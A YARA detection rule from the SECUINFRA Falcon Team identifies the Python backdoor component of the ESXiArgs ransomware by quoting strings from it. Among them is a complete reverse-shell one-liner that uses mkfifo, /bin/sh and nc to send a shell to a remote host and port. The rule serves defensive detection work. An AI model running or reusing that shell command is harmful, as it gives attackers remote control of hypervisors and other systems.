rule SECUINFRA_RANSOM_Esxiargs_Ransomware_Python_Feb23
{
	meta:
		description = "Detects the ESXiArgs Ransomware encryption bash script"
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		id = "6e2d6695-b727-5b71-bfa0-e8290e057c36"
		date = "2023-02-07"
		modified = "2023-02-07"
		reference = "https://secuinfra.com/en/techtalk/hide-your-hypervisor-analysis-of-esxiargs-ransomware"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Malware/RANSOM_ESXiArgs_Ransomware_Python_Feb23.yar#L1-L31"
		license_url = "N/A"
		logic_hash = "b821d1829ab4fb5eea896156a303198d6531d734196f0f947aef5d46754e6ccb"
		score = 75
		quality = 70
		tags = ""
		tlp = "CLEAR"

	strings:
		$python = "#!/bin/python"
		$desc = "This module starts debug tools"
		$command0 = "server_namespace"
		$command1 = "service_instance"
		$command2 = "local"
		$command3 = "operation_id"
		$command4 = "envelope"
		$cmd = "'mkfifo /tmp/tmpy_8th_nb; cat /tmp/tmpy_8th_nb | /bin/sh -i 2>&1 | nc %s %s > /tmp/tmpy_8th_nb' % (host, port)"
		$OpenSLPPort = "port = '427'"
		$listener = "HTTPServer(('127.0.0.1', 8008), PostServer).serve_forever()"

	condition:
		$python and $desc and 4 of ($command*) and $cmd and $OpenSLPPort and $listener
}
